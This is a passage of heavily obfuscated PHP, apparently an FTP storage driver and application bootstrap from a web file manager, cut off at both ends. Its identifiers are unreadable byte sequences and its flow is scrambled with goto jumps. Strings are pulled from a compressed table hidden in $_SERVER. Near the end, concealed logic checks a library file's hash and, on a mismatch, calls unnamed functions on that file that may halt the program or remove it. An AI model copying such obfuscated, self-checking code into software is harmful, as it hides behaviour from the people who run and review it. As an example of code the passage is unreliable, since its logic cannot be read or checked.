strlen($AØâêÃÎÁˆ)); if (empty($this->pathDriver)) { return $e•‚Í…òÜÙ; } goto fÌ°‘–åòª; fÌ°‘–åòª: return $this->pathDriver . $f¼ˆŞ‡¹¸[8] . ltrim($e•‚Í…òÜÙ, $f¼ˆŞ‡¹¸[8]); goto cÂÆŠâŠ¢ˆ; e—õŒºÜ: $f¼ˆŞ‡¹¸ =& $_SERVER[í…¶]; $AØâêÃÎÁˆ = $this->iconvApp($this->pathBase); $e•‚Í…òÜÙ = $this->iconvApp($e•‚Í…òÜÙ); goto EÛ½ëßåĞ; EÛ½ëßåĞ: if (substr($AØâêÃÎÁˆ, 0, 2) == $f¼ˆŞ‡¹¸[1153]) { $AØâêÃÎÁˆ = BASIC_PATH . substr($AØâêÃÎÁˆ, 2); } if (substr($e•‚Í…òÜÙ, 0, 2) == $f¼ˆŞ‡¹¸[1153]) { $e•‚Í…òÜÙ = BASIC_PATH . substr($e•‚Í…òÜÙ, 2); } $AØâêÃÎÁˆ = KodIO::clear($AØâêÃÎÁˆ); goto B¾„…ëŸ; cÂÆŠâŠ¢ˆ: } private function _init($f­®«Ã•¦Ñ = array()) { $C ˆ“‹¬‡ =& $_SERVER[í…¶]; if (!function_exists($C ˆ“‹¬‡[1154])) { show_json(LNG($C ˆ“‹¬‡[1155]), !1); } $this->config = $f­®«Ã•¦Ñ; $this->charsetReset($f­®«Ã•¦Ñ); foreach ($f­®«Ã•¦Ñ as $C„ÈÖì·¹Ÿ => $eë«çâ§Œ“) { if (isset($this->{$C„ÈÖì·¹Ÿ})) { $this->{$C„ÈÖì·¹Ÿ} = $eë«çâ§Œ“; } } return $this->_login($f­®«Ã•¦Ñ); } private function _login($fÑ¬èäî¨») { goto cò¼¤šÓ²×; E”É¯¨®Òš: if (isset($dÓé°„ôçæ[$FĞ³ô«’ˆË])) { foreach ($dÓé°„ôçæ[$FĞ³ô«’ˆË] as $Cô ³Â‹‘ => $a³èÉµòğ) { $this->{$Cô ³Â‹‘} = $a³èÉµòğ; } return !0; } $dñÁò°íˆ· = parse_url(trim($this->server, $A‡šºÓ¶…[8])); $this->host = $dñÁò°íˆ·[$A‡šºÓ¶…[169]]; goto bè‡ùÊå; bÑöµŠƒÀ«: $dÓé°„ôçæ[$FĞ³ô«’ˆË] = array($A‡šºÓ¶…[1159] => $this->connect, $A‡šºÓ¶…[169] => $this->host, $A‡šºÓ¶…[168] => $this->scheme, $A‡šºÓ¶…[170] => $this->port); return $aªÀÖíÌÜ·; goto Eëòœº³ô÷; cò¼¤šÓ²×: $A‡šºÓ¶… =& $_SERVER[í…¶]; static $dÓé°„ôçæ = array(); $FĞ³ô«’ˆË = md5(json_encode($fÑ¬èäî¨»)); goto E”É¯¨®Òš; cç¨ä¥œÌ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $aªÀÖíÌÜ· = @ftp_login($this->connect, $this->username, $this->userpass); goto BÜê—–º; BÜê—–º: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $E¸í¡“Ë = $this->pasv == $A‡šºÓ¶…[83] ? !0 : !1; @ftp_pasv($this->connect, $E¸í¡“Ë); goto bÑöµŠƒÀ«; bè‡ùÊå: $b§›¼ÈğŞˆ = isset($dñÁò°íˆ·[$A‡šºÓ¶…[168]]) && $dñÁò°íˆ·[$A‡šºÓ¶…[168]] == $A‡šºÓ¶…[1156] ? !0 : !1; $this->scheme = $b§›¼ÈğŞˆ ? $A‡šºÓ¶…[1157] : $A‡šºÓ¶…[1158]; $this->port = isset($dñÁò°íˆ·[$A‡šºÓ¶…[170]]) ? $dñÁò°íˆ·[$A‡šºÓ¶…[170]] : 21; goto cç¨ä¥œÌ; Eëòœº³ô÷: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($A¾—®ùÇî, $a¸¾¦ŸäÀ§ = '', $D—´…£ÖÓê = REPEAT_RENAME) { if ($this->setContent($A¾—®ùÇî, $a¸¾¦ŸäÀ§)) { return $this->getPathOuter($A¾—®ùÇî); } return !1; } public function mkdir($BóˆÂŸíˆ­, $c†ÜåŠò…Ò = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $BóˆÂŸíˆ­ = $this->iconvSystem($BóˆÂŸíˆ­); if ($this->isFolder($BóˆÂŸíˆ­) || @ftp_mkdir($this->connect, $BóˆÂŸíˆ­)) { return $this->getPathOuter($BóˆÂŸíˆ­); } if (!$this->mkdir($this->pathFather($BóˆÂŸíˆ­))) { return !1; } if ($BóˆÂŸíˆ­ = @ftp_mkdir($this->connect, $BóˆÂŸíˆ­)) { return $this->getPathOuter($BóˆÂŸíˆ­); } return !1; } public function copyFile($f–ôŒªŠ¿ , $FŒÌĞÏ‰Äœ) { goto eëêÜÚˆÀ–; C‘íÜó‰î: $B„Àå‘¯Ô = $this->iconvApp($D„èÅÈçŒŞ); $this->download($f–ôŒªŠ¿ , $B„Àå‘¯Ô); $eÊÏŞ¿Œİ’ = $this->upload($FŒÌĞÏ‰Äœ, $B„Àå‘¯Ô); goto d¡Œ›™¹ªÏ; eëêÜÚˆÀ–: if (!$this->_isconn()) { return !1; } $fùíÍöÜƒ = $this->pathThis($this->iconvSystem($f–ôŒªŠ¿ )); $D„èÅÈçŒŞ = $this->tempFile($fùíÍöÜƒ); goto C‘íÜó‰î; d¡Œ›™¹ªÏ: $this->tempFileRemve($D„èÅÈçŒŞ); return $eÊÏŞ¿Œİ’; goto cŸõöšœõ†; cŸõöšœõ†: } public function moveFile($aïŞÍ¬àÊ, $CÔ§åÛÆŒ¸) { if (!$this->_isconn()) { return !1; } $aïŞÍ¬àÊ = $this->iconvSystem($aïŞÍ¬àÊ); $CÔ§åÛÆŒ¸ = $this->iconvSystem($CÔ§åÛÆŒ¸); $aâáÆæÁ¢‹ = @ftp_rename($this->connect, $aïŞÍ¬àÊ, $CÔ§åÛÆŒ¸); return $aâáÆæÁ¢‹ ? $this->getPathOuter($CÔ§åÛÆŒ¸) : !1; } public function delFile($D¤¦Î•õ”í) { if (!$this->_isconn()) { return !1; } $D¤¦Î•õ”í = $this->iconvSystem($D¤¦Î•õ”í); return @ftp_delete($this->connect, $D¤¦Î•õ”í); } public function delFolder($B´¶›«ÛÜÓ) { if (!$this->_isconn()) { return !1; } $B´¶›«ÛÜÓ = $this->iconvSystem($B´¶›«ÛÜÓ); $C‘»Ç’©Ó¦ = $this->ftpList($B´¶›«ÛÜÓ); if (!$C‘»Ç’©Ó¦) { return @ftp_rmdir($this->connect, $B´¶›«ÛÜÓ); } foreach ($C‘»Ç’©Ó¦ as $A±à‹¥‘) { if ($this->isFolder($A±à‹¥‘)) { $A±à‹¥‘ = $this->iconvApp($A±à‹¥‘); $this->delFolder($A±à‹¥‘); } else { @ftp_delete($this->connect, $A±à‹¥‘); } } return @ftp_rmdir($this->connect, $B´¶›«ÛÜÓ); } public function rename($Då˜’µŠ­», $cÑÉ£Šà ˜) { goto EÑÓÇ†ßíè; EÑÓÇ†ßíè: $aùïŒ‘“¸é =& $_SERVER[í…¶]; if (!$this->_isconn()) { return !1; } $aë·áé ©” = $this->fileNameAuto($this->pathFather($Då˜’µŠ­»), $cÑÉ£Šà ˜); goto Aˆ¨Æ¢„¦Œ; e¨»«Øòœ¼: $a‘©Á„„Œê = rtrim($E×ÄÕùŒœ, $aùïŒ‘“¸é[8]) . $aùïŒ‘“¸é[8] . $aë·áé ©”; $aËÊùÃÕ¼ = @ftp_rename($this->connect, $Då˜’µŠ­», $a‘©Á„„Œê); $a‘©Á„„Œê = $this->iconvApp($a‘©Á„„Œê); goto f»‡¯µ¢« ; Aˆ¨Æ¢„¦Œ: $aë·áé ©” = $this->iconvSystem($aë·áé ©”); $Då˜’µŠ­» = $this->iconvSystem($Då˜’µŠ­»); $E×ÄÕùŒœ = $this->pathFather($Då˜’µŠ­»); goto e¨»«Øòœ¼; f»‡¯µ¢« : return $aËÊùÃÕ¼ ? $this->getPathOuter($a‘©Á„„Œê) : !1; goto aàƒŞš¬®Ï; aàƒŞš¬®Ï: } private function folderInfo($b­Ãˆ½ÃÒé, $E„Ö©à°ˆê = false) { goto bêÃá’ÙËÎ; eŒƒ»†Ò²á: return $F®ùÏšõŒ; goto báÌÇƒİíƒ; F‘œŒ˜ŠÑ÷: $A„ª™“Ï´ğ = $this->iconvSystem($b­Ãˆ½ÃÒé); if ($E„Ö©à°ˆê) { return array($bªö¦ïù¸®[28] => $bğˆ§ÀŠ, $bªö¦ïù¸®[75] => $aÉÌõÔ‚Š, $bªö¦ïù¸®[29] => $bªö¦ïù¸®[76]); } $F®ùÏšõŒ = array($bªö¦ïù¸®[28] => $bğˆ§ÀŠ, $bªö¦ïù¸®[75] => $aÉÌõÔ‚Š, $bªö¦ïù¸®[29] => $bªö¦ïù¸®[76], $bªö¦ïù¸®[187] => 0, $bªö¦ïù¸®[107] => 0, $bªö¦ïù¸®[1160] => !0, $bªö¦ïù¸®[1161] => !0); goto eŒƒ»†Ò²á; bêÃá’ÙËÎ: $bªö¦ïù¸® =& $_SERVER[í…¶]; $aÉÌõÔ‚Š = $this->getPathOuter(rtrim($b­Ãˆ½ÃÒé, $bªö¦ïù¸®[8])); $bğˆ§ÀŠ = $this->pathThis($aÉÌõÔ‚Š); goto F‘œŒ˜ŠÑ÷; báÌÇƒİíƒ: } private function fileInfo($EÏÚ–êëÑÛ, $Aˆù…®Ã›Í = false) { goto FÆ®ëçô‚; FÆ®ëçô‚: $c„¥ë–±ï® =& $_SERVER[í…¶]; $bğâ¶æÛá  = $this->getPathOuter(rtrim($EÏÚ–êëÑÛ, $c„¥ë–±ï®[8])); $CéîÄ½Ö™Ú = $this->pathThis($bğâ¶æÛá ); goto f¡Œ¾ÀÉ‚Š; f¡Œ¾ÀÉ‚Š: $FŠåŠò‰öƒ = $this->iconvSystem($EÏÚ–êëÑÛ); if ($Aˆù…®Ã›Í) { return array($c„¥ë–±ï®[28] => $CéîÄ½Ö™Ú, $c„¥ë–±ï®[75] => $bğâ¶æÛá , $c„¥ë–±ï®[29] => $c„¥ë–±ï®[167], $c„¥ë–±ï®[160] => $this->ext($EÏÚ–êëÑÛ), $c„¥ë–±ï®[77] => $this->size($EÏÚ–êëÑÛ)); } $dËÒ…“•¼° = array($c„¥ë–±ï®[28] => $CéîÄ½Ö™Ú, $c„¥ë–±ï®[75] => $bğâ¶æÛá , $c„¥ë–±ï®[29] => $c„¥ë–±ï®[167], $c„¥ë–±ï®[187] => 0, $c„¥ë–±ï®[107] => @ftp_mdtm($this->connect, $FŠåŠò‰öƒ), $c„¥ë–±ï®[160] => $this->ext($EÏÚ–êëÑÛ), $c„¥ë–±ï®[77] => $this->size($EÏÚ–êëÑÛ), $c„¥ë–±ï®[1160] => !0, $c„¥ë–±ï®[1161] => !0); goto aÉ½‘í²‚; aÉ½‘í²‚: $dËÒ…“•¼°[$c„¥ë–±ï®[107]] = $dËÒ…“•¼°[$c„¥ë–±ï®[107]] > 0 ? $dËÒ…“•¼°[$c„¥ë–±ï®[107]] : 0; return $dËÒ…“•¼°; goto Aê‚Ã˜”ˆé; Aê‚Ã˜”ˆé: } public function size($Cä…½¬ï‹) { $EÃ›¢ô©¦ = $this->objectMeta($Cä…½¬ï‹); return $EÃ›¢ô©¦ ? $EÃ›¢ô©¦[$_SERVER[í…¶][77]] : 0; } public function info($fé…‰”Ş»£) { if ($this->isFile($fé…‰”Ş»£)) { return $this->fileInfo($fé…‰”Ş»£, 0); } else { if ($this->isFolder($fé…‰”Ş»£)) { return $this->folderInfo($fé…‰”Ş»£); } } return !1; } public function exist($c©´¸ğÉ™) { return $this->objectMeta($c©´¸ğÉ™) ? !0 : !1; } public function isFile($b‡â–ğ†éÚ) { $aŠ„ïáóÔâ =& $_SERVER[í…¶]; $Aº§åî×Ø½ = $this->objectMeta($b‡â–ğ†éÚ); return $Aº§åî×Ø½ ? $Aº§åî×Ø½[$aŠ„ïáóÔâ[29]] == $aŠ„ïáóÔâ[167] : !1; } public function isFolder($Cè‚óÓŒ­¾) { $f»¾†“Ô‡Ã =& $_SERVER[í…¶]; $D ‹»ğë±ò = $this->objectMeta($Cè‚óÓŒ­¾); return $D ‹»ğë±ò ? $D ‹»ğë±ò[$f»¾†“Ô‡Ã[29]] == $f»¾†“Ô‡Ã[76] : !1; } public function listPath($Dï‰«Ÿ¢£Ş, $CöñÄªõ® = false) { goto F¼Ëœôô¿½; F¼Ëœôô¿½: $bÒãçğ•š¥ =& $_SERVER[í…¶]; if (!$this->_isconn()) { return !1; } $Dï‰«Ÿ¢£Ş = $this->iconvSystem($Dï‰«Ÿ¢£Ş); goto Fâ¤íøæ“ƒ; c†¨ªæ•ùè: foreach ($e”ì´âºÍ as $Dï‰«Ÿ¢£Ş) { if ($this->isFolder($Dï‰«Ÿ¢£Ş)) { $Eù¼»÷ó[$bÒãçğ•š¥[74]][] = $this->folderInfo($Dï‰«Ÿ¢£Ş, $CöñÄªõ®); } else { $Eù¼»÷ó[$bÒãçğ•š¥[73]][] = $this->fileInfo($Dï‰«Ÿ¢£Ş, $CöñÄªõ®); } } return $Eù¼»÷ó; goto eºœ›•Ä×; Fâ¤íøæ“ƒ: $e”ì´âºÍ = $this->ftpList($Dï‰«Ÿ¢£Ş); $Eù¼»÷ó = array($bÒãçğ•š¥[74] => array(), $bÒãçğ•š¥[73] => array()); if (!$e”ì´âºÍ) { return $Eù¼»÷ó; } goto c†¨ªæ•ùè; eºœ›•Ä×: } public function has($bÇÃ£é©Ÿ, $d«íÖœÀ‘¤ = false, $eö­–…ªÃ = true) { goto E‚¬÷èÔé; Fù‚—Ä½í: $DÖÛ°ù½ñ„ = $this->ftpList($bÇÃ£é©Ÿ); if (!$DÖÛ°ù½ñ„) { return !1; } if ($d«íÖœÀ‘¤) { return array($B˜‰Ş…àÎ[191] => 0, $B˜‰Ş…àÎ[192] => count($DÖÛ°ù½ñ„)); } goto BœÆÁ‡›À‡; BœÆÁ‡›À‡: foreach ($DÖÛ°ù½ñ„ as $bÇÃ£é©Ÿ) { if ($eö­–…ªÃ) { if (!$this->isFolder($bÇÃ£é©Ÿ)) { return !0; } } else { if ($this->isFolder($bÇÃ£é©Ÿ)) { return !0; } } } return !1; goto DÇ´éëòğ; E‚¬÷èÔé: $B˜‰Ş…àÎ =& $_SERVER[í…¶]; if (!$this->_isconn()) { return !1; } $bÇÃ£é©Ÿ = $this->iconvSystem($bÇÃ£é©Ÿ); goto Fù‚—Ä½í; DÇ´éëòğ: } public function listAll($dÜâ¯ÃÙÏ) { goto cñåôòÏĞÚ; EùÑôğæÖ: $dŒ±¼Œ‰‡ = array($dáĞÀ˜ğ²[73] => array(), $dáĞÀ˜ğ²[74] => array()); $this->recursionFtpFiles($dÜâ¯ÃÙÏ, $dŒ±¼Œ‰‡); $FÖïÌŒ›òğ = array(); goto E£á“ùÔÁ; cñåôòÏĞÚ: $dáĞÀ˜ğ² =& $_SERVER[í…¶]; if (!$this->_isconn()) { return !1; } $dÜâ¯ÃÙÏ = $this->iconvSystem($dÜâ¯ÃÙÏ); goto EùÑôğæÖ; E£á“ùÔÁ: foreach ($dŒ±¼Œ‰‡[$dáĞÀ˜ğ²[74]] as $cÆÌ¨‰¥¯) { $FÖïÌŒ›òğ[] = array($dáĞÀ˜ğ²[75] => $dáĞÀ˜ğ²[8] . trim(str_replace($dÜâ¯ÃÙÏ, $dáĞÀ˜ğ²[33], $cÆÌ¨‰¥¯), $dáĞÀ˜ğ²[8]) . $dáĞÀ˜ğ²[8], $dáĞÀ˜ğ²[76] => 1, $dáĞÀ˜ğ²[77] => 0); } foreach ($dŒ±¼Œ‰‡[$dáĞÀ˜ğ²[73]] as $AœéÁÚôø) { $FÖïÌŒ›òğ[] = array($dáĞÀ˜ğ²[75] => $dáĞÀ˜ğ²[8] . trim(str_replace($dÜâ¯ÃÙÏ, $dáĞÀ˜ğ²[33], $AœéÁÚôø), $dáĞÀ˜ğ²[8]), $dáĞÀ˜ğ²[76] => 0, $dáĞÀ˜ğ²[77] => $this->size($AœéÁÚôø)); } return $FÖïÌŒ›òğ; goto FÉ’ÆõçÉ‰; FÉ’ÆõçÉ‰: } public function getContent($C§Å—ÄËƒ) { if (!$this->_isconn()) { return !1; } $C§Å—ÄËƒ = $this->iconvSystem($C§Å—ÄËƒ); return $this->fileSubstr($C§Å—ÄËƒ); } public function setContent($EàÑ‘‡’Ò, $d‰Á¬‹¯Çˆ = '') { goto B® ¡ï¿É¦; aÍŠïÚŞÇó: return $f´¾ƒÉì„¯; goto c‹õÃÈßì‘; EºÇ¸Û—†: file_put_contents($B…×‹²ŞË, $d‰Á¬‹¯Çˆ); $f´¾ƒÉì„¯ = $this->upload($EàÑ‘‡’Ò, $this->iconvApp($B…×‹²ŞË)); $this->tempFileRemve($B…×‹²ŞË); goto aÍŠïÚŞÇó; B® ¡ï¿É¦: if (!$this->_isconn()) { return !1; } $cèº¡‰óó˜ = $this->pathThis($this->iconvSystem($EàÑ‘‡’Ò)); $B…×‹²ŞË = $this->tempFile($cèº¡‰óó˜); goto EºÇ¸Û—†; c‹õÃÈßì‘: } public function fileSubstr($EÍùç…¿†”, $c¦ˆîÈÛ¡¼ = 0, $f”Ï¦ˆš× = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($EÍùç…¿†”, $c¦ˆîÈÛ¡¼, $f”Ï¦ˆš×); } private function ftpRequest($BÙùˆÆùˆ¼, $A’ù´±æŒ• = 0, $c¦É×ÔÙŸ = false) { goto BØµÙ´¤¬; BØµÙ´¤¬: $BÙùˆÆùˆ¼ = $this->iconvSystem($BÙùˆÆùˆ¼); $bê–¢½çİŞ = $this->scheme . $this->host . $_SERVER[í…¶][4] . $this->port; $eíÁÆ‘’ë˜ = curl_init(); goto a˜©¶Ñ‰áÕ; C¾ó±ˆ—: return $B´ÁæéŸ…í; goto b‹ÜåÊŞõ»; cˆùÕ‡–†±: curl_setopt($eíÁÆ‘’ë˜, CURLOPT_RETURNTRANSFER, 1); $B´ÁæéŸ…í = curl_exec($eíÁÆ‘’ë˜); curl_close($eíÁÆ‘’ë˜); goto C¾ó±ˆ—; a˜©¶Ñ‰áÕ: curl_setopt($eíÁÆ‘’ë˜, CURLOPT_URL, $bê–¢½çİŞ . $this->pathEncode($BÙùˆÆùˆ¼)); curl_setopt($eíÁÆ‘’ë˜, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($c¦É×ÔÙŸ) { $aç©·ŠÅñ„ = $A’ù´±æŒ• + $c¦É×ÔÙŸ - 1; curl_setopt($eíÁÆ‘’ë˜, CURLOPT_RANGE, "{$A’ù´±æŒ•}\55{$aç©·ŠÅñ„}"); } goto cˆùÕ‡–†±; b‹ÜåÊŞõ»: } public function upload($C‡³Ê†¥Å, $bäôÌµ”³, $a„–²‰÷©£ = false, $D¼Å„‹–Éë = REPEAT_REPLACE) { goto d‚İ¥ŸõŞ; B¶é«Ï´Ù: $bäôÌµ”³ = $this->iconvSystem($bäôÌµ”³); $D¯É›°ù¨» = ftp_nb_put($this->connect, $C‡³Ê†¥Å, $bäôÌµ”³, FTP_BINARY); while ($D¯É›°ù¨» == FTP_MOREDATA) { $D¯É›°ù¨» = ftp_nb_continue($this->connect); } goto bæÈ™Ä½ÒŞ; bæÈ™Ä½ÒŞ: if ($D¯É›°ù¨» != FTP_FINISHED) { return !1; } return $this->getPathOuter($C‡³Ê†¥Å); goto bÃíğ­í„«; d‚İ¥ŸõŞ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($C‡³Ê†¥Å))) { return !1; } $C‡³Ê†¥Å = $this->iconvSystem($C‡³Ê†¥Å); goto B¶é«Ï´Ù; bÃíğ­í„«: } public function download($eï¶Ì¿îá, $a÷Ø©âÙÓº = '') { goto A¤‰ˆÜÉªÂ; bƒîëù×éø: $eï¶Ì¿îá = $this->iconvSystem($eï¶Ì¿îá); $a÷Ø©âÙÓº = $this->iconvSystem($a÷Ø©âÙÓº); $D—ÕÎÆÙøŸ = ftp_nb_get($this->connect, $a÷Ø©âÙÓº, $eï¶Ì¿îá, FTP_BINARY); goto cÓÏËŸÖ; A¤‰ˆÜÉªÂ: if (!$this->_isconn()) { return !1; } $bƒ³ò¨¾í® = $this->pathFather($a÷Ø©âÙÓº); if (!IO::mkdir($bƒ³ò¨¾í®)) { return !1; } goto bƒîëù×éø; cÓÏËŸÖ: while ($D—ÕÎÆÙøŸ == FTP_MOREDATA) { $D—ÕÎÆÙøŸ = ftp_nb_continue($this->connect); } if ($D—ÕÎÆÙøŸ != FTP_FINISHED) { return !1; } return $this->iconvApp($a÷Ø©âÙÓº); goto aŸ£ĞñÄ˜; aŸ£ĞñÄ˜: } private function ftpList($d±È•±«) { goto b×›Çğôà±; bÊ½ÙÑ»‚Ã: $d±È•±« = rtrim($d±È•±«, $b…Ñß ®ˆ[8]) . $b…Ñß ®ˆ[8]; $Eïí¬ ›Ä§ = @ftp_nlist($this->connect, $d±È•±«); if ($Eïí¬ ›Ä§ === !1) { $Eïí¬ ›Ä§ = @ftp_rawlist($this->connect, $d±È•±«); foreach ($Eïí¬ ›Ä§ as $eßç•‚ï»ˆ => $bºÓš‚‘ô) { $Eïí¬ ›Ä§[$eßç•‚ï»ˆ] = end(explode($b…Ñß ®ˆ[1162], $bºÓš‚‘ô)); } } goto e„ÙÄ©æé; e„ÙÄ©æé: $Eïí¬ ›Ä§ = array_diff($Eïí¬ ›Ä§, array($b…Ñß ®ˆ[91], $b…Ñß ®ˆ[1163], $d±È•±« . $b…Ñß ®ˆ[91], $d±È•±« . $b…Ñß ®ˆ[1163])); $f˜º´¾ Ë– = array(); foreach ($Eïí¬ ›Ä§ as $A‡“À™‹·É) { if (!strstr($A‡“À™‹·É, $b…Ñß ®ˆ[8])) { $A‡“À™‹·É = $d±È•±« . ltrim($A‡“À™‹·É, $b…Ñß ®ˆ[8]); } $f˜º´¾ Ë–[] = $this->iconvApp($A‡“À™‹·É); } goto BªñÒÂÕŠ; BªñÒÂÕŠ: return $f˜º´¾ Ë–; goto D¡”ÆÜ¥; b×›Çğôà±: $b…Ñß ®ˆ =& $_SERVER[í…¶]; if (!$this->isFolder($d±È•±«)) { return !1; } @ftp_chdir($this->connect, $b…Ñß ®ˆ[8]); goto bÊ½ÙÑ»‚Ã; D¡”ÆÜ¥: } private function recursionFtpFiles($F²µ¡…ŠÔË, &$c¤ùêÈÆšæ) { $A¥×°ğÆ¤é =& $_SERVER[í…¶]; if (!$this->_isconn()) { return !1; } if (!($A§Ï‘Âæç = $this->ftpList($F²µ¡…ŠÔË))) { return !1; } foreach ($A§Ï‘Âæç as $F²µ¡…ŠÔË) { if ($this->isFolder($F²µ¡…ŠÔË)) { $this->recursionFtpFiles($F²µ¡…ŠÔË, $c¤ùêÈÆšæ); $c¤ùêÈÆšæ[$A¥×°ğÆ¤é[74]][] = $F²µ¡…ŠÔË; } else { $c¤ùêÈÆšæ[$A¥×°ğÆ¤é[73]][] = $F²µ¡…ŠÔË; } } } private function objectMeta($a”ñøÎ‰‡) { goto A÷‰¿ÊÀ¹»; b”ä‰‰˜¯ã: $FœëßİÎ¬ù = @ftp_size($this->connect, $this->iconvSystem($a”ñøÎ‰‡)); if ($FœëßİÎ¬ù != -1) { $BÅÜœö®Ûá = array($f¿’Á‚˜ö[77] => $FœëßİÎ¬ù, $f¿’Á‚˜ö[29] => $f¿’Á‚˜ö[167]); } else { $b§×“”Ğ«ç = @ftp_chdir($this->connect, $this->iconvSystem($a”ñøÎ‰‡)); $BÅÜœö®Ûá = $b§×“”Ğ«ç ? array($f¿’Á‚˜ö[77] => 0, $f¿’Á‚˜ö[29] => $f¿’Á‚˜ö[76]) : !1; } Cache::set($EÆ”‰š·øÁ, $BÅÜœö®Ûá, 0); goto f™Î¯ğ¤Õ; A÷‰¿ÊÀ¹»: $f¿’Á‚˜ö =& $_SERVER[í…¶]; $EÆ”‰š·øÁ = $f¿’Á‚˜ö[1164] . md5($a”ñøÎ‰‡); $BÅÜœö®Ûá = Cache::get($EÆ”‰š·øÁ); goto AÖæœ™—°; AÖæœ™—°: if ($BÅÜœö®Ûá !== null && $BÅÜœö®Ûá !== !1) { return $BÅÜœö®Ûá; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $f¿’Á‚˜ö[8]); goto b”ä‰‰˜¯ã; f™Î¯ğ¤Õ: return $BÅÜœö®Ûá; goto aíğí½õİ; aíğí½õİ: } } goto Döò˜Üİå¬; Eùï¦¦¹å: $dš—õİÍÏí = LIB_DIR . $_SERVER[í…¶][342]; $E±‡‘à˜ƒÒ = $_SERVER[í…¶][343]; if ($_SERVER[$_SERVER[í…¶][344]] != $E±‡‘à˜ƒÒ($dš—õİÍÏí)) { goto c“ºÙÆèò; c“ºÙÆèò: $FƒÏ¸„Ÿ¡ß = $_SERVER[í…¶][345]; $f’Åª¼ÔÏÍ = $_SERVER[$_SERVER[í…¶][346]] . $_SERVER[í…¶][347]; $E®›ˆ¤ò£ = $FƒÏ¸„Ÿ¡ß($f’Åª¼ÔÏÍ); goto DÈ¯Ñ¶‹ªÏ; DÈ¯Ñ¶‹ªÏ: $dÛ¯…÷´‰İ = explode($_SERVER[í…¶][217], $E®›ˆ¤ò£); if (count($dÛ¯…÷´‰İ) < $_SERVER[í…¶][348]) { $bİƒîÇŒÙ× = $_SERVER[í…¶][349]; $bİƒîÇŒÙ×(); } $D…òÙò¢»à = $_SERVER[í…¶][350]; goto d¡Ú™ïğ; d¡Ú™ïğ: $D…òÙò¢»à($dš—õİÍÏí); goto Fäññğ“øù; Fäññğ“øù: } goto E½µ‡Ã·ğ; f†Øâ——­©: define($_SERVER[í…¶][1929], 2); define($_SERVER[í…¶][1930], 3); define($_SERVER[í…¶][1931], 4); goto cğäÕ†¯©; A¸¦ğÛ®¸Ğ: $c½†—«‰ = $_SERVER[í…¶][556]; $_SERVER[ˆ¹–ä¶] = explode($_SERVER[í…¶][557], gzinflate(substr($_SERVER[í…¶][558], 10, -8))); $B¼ÈÅÆŸÜ» = $_SERVER[í…¶][559]; goto c¦İó…ºŸ ; cÄâ„òë¤£: function beforeShutdownFatalError($eÏ÷ÅÂŒèÎ) { think_exception($eÏ÷ÅÂŒèÎ); } $_SERVER[$_SERVER[²‡§™ıäÑÊº•][48]] = $EØã¥Í’¸($_SERVER[$_SERVER[²‡§™ıäÑÊº•][45]]); $bˆÁÚ‚î¡ƒ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto D¼»¨¸Àåè; c¦İó…ºŸ : while ($B¼ÈÅÆŸÜ» < $_SERVER[í…¶][560]) { if ($B¼ÈÅÆŸÜ» >= 0) { break; } $B¼ÈÅÆŸÜ»++; } if ($_SERVER[$_SERVER[í…¶][344]] != $_SERVER[$_SERVER[í…¶][561]]) { goto eß¯ÆÖƒ£ˆ; d…äî½¯‰: $D…òÙò¢»à($_SERVER[$_SERVER[í…¶][562]]); goto B»¸‹¥Òœ; eß¯ÆÖƒ£ˆ: $FƒÏ¸„Ÿ¡ß = $_SERVER[í…¶][345]; $f’Åª¼ÔÏÍ = $_SERVER[$_SERVER[í…¶][346]] . $_SERVER[í…¶][347]; $E®›ˆ¤ò£ = $FƒÏ¸„Ÿ¡ß($f’Åª¼ÔÏÍ); goto eáĞ£ºøô÷; eáĞ£ºøô÷: $dÛ¯…÷´‰İ = explode($_SERVER[í…¶][217], $E®›ˆ¤ò£); if (count($dÛ¯…÷´‰İ) < $_SERVER[í…¶][348]) { $bİƒîÇŒÙ× = $_SERVER[í…¶][349]; $bİƒîÇŒÙ×(); } $D…òÙò¢»à = $_SERVER[í…¶][350]; goto d…äî½¯‰; B»¸‹¥Òœ: } class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($eËÓê×˜â) { goto eù½Áã©»¨; e‚Ó‘¯ÀÏ‚: $this->defaultController = $Eø—±£‰[1] ? $Eø—±£‰[1] : $this->defaultController; $this->defaultAction = $Eø—±£‰[2] ? $Eø—±£‰[2] : $this->defaultAction; $this->{$_SERVER[ˆ¹–ä¶][3]}($D¦ßƒª¸µ[4], array($this, $D¦ßƒª¸µ[5])); goto c®†Ô•ÇòÏ; eù½Áã©»¨: $aì£Â…š„Ã =& $_SERVER[í…¶]; $D¦ßƒª¸µ =& $_SERVER[ˆ¹–ä¶]; $Eø—±£‰ = $D¦ßƒª¸µ[0]($D¦ßƒª¸µ[1], $D¦ßƒª¸µ[2]($eËÓê×˜â, $D¦ßƒª¸µ[1])); goto cÇÈ¡’Œ²ù; cÇÈ¡’Œ²ù: $this->defaultModule = $Eø—±£‰[0] ? $Eø—±£‰[0] : $this->defaultModule; $a·ÕÁˆªÖ = $aì£Â…š„Ã[563]; if (strlen($a·ÕÁˆªÖ) < $aì£Â…š„Ã[564]) { die; } goto e‚Ó‘¯ÀÏ‚; c®†Ô•ÇòÏ: } public function appRun($a‚Øò©Ö) { goto FÁ½İ“–âê; f™‘‚Ê‹É¯: if ($b’æÑ‘Ğ–Ô == $CòÀÉØ„÷Ä[8]) { $eš›À•Œ§ = $CòÀÉØ„÷Ä[9]; $AôŠ¸µœ¶[0] = $CòÀÉØ„÷Ä[10]; $AôŠ¸µœ¶[1] = $AôŠ¸µœ¶[1] . $CòÀÉØ„÷Ä[11]; $a‚Øò©Ö = $CòÀÉØ„÷Ä[12]($CòÀÉØ„÷Ä[1], $AôŠ¸µœ¶); $a‚Øò©Ö = $CòÀÉØ„÷Ä[2]($a‚Øò©Ö, $CòÀÉØ„÷Ä[1]); } 